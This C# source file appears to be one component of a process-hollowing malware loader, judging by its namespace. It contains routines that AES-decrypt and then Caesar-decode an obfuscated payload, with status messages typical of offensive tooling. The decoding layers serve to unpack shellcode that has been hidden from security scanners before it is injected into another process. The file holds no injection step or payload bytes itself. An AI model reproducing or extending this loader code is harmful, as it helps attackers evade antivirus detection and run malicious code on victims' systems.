using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;

namespace ProcessHollowingExe
{
    public class PFuncs
    {

        private static byte[] AesDecrypt(byte[] input, string password, byte[] iv)
        {
            try
            {
                var pdb =
                    new PasswordDeriveBytes(password, iv);
                var ms = new MemoryStream();
                Aes aes = new AesManaged();
                aes.KeySize = 256;
                aes.Key = pdb.GetBytes(aes.KeySize / 8);
                aes.IV = pdb.GetBytes(aes.BlockSize / 8);
                var cs = new CryptoStream(ms,
                    aes.CreateDecryptor(), CryptoStreamMode.Write);
                cs.Write(input, 0, input.Length);
                cs.Close();
                Console.WriteLine("[+] Successfully Decrypted AES Payload.");
                return ms.ToArray();
            }
            catch (Exception e)
            {
                Console.WriteLine($"[-] FAILED Decrypting AES Payload!: {e.Message}");
                throw;
            }
        }

        public static byte[] CaesarDecrypt(byte[] buffer, string password, byte[] iv)
        {
            Console.WriteLine($"[+] Decrypting AES Payload.");
            var decrypted = AesDecrypt(buffer, password, iv);

            Console.WriteLine($"[+] Decoding Caesar Encoded Payload.");
            var decoded = new byte[decrypted.Length];

            for (var i = 0; i < decrypted.Length; i++)
            {
                decoded[i] = (byte)(((uint)decrypted[i] - 5) & 0xFF);//decode 5 iterations
            }

            Console.WriteLine($"[+] Successfully Decoded Caesar Payload.");
            return decoded;
        }
    }
}